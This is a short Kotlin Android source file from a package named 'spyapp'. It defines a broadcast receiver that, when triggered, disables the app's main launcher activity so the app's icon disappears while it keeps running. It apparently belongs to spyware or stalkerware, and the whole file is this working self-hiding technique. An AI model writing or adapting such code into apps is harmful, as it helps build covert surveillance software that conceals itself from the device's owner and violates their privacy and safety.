package com.hackernight.spyapp

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager

class HideReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val cn = ComponentName(context, "com.hackernight.spyapp.MainActivity")
        context.packageManager.setComponentEnabledSetting(
            cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
    }
}
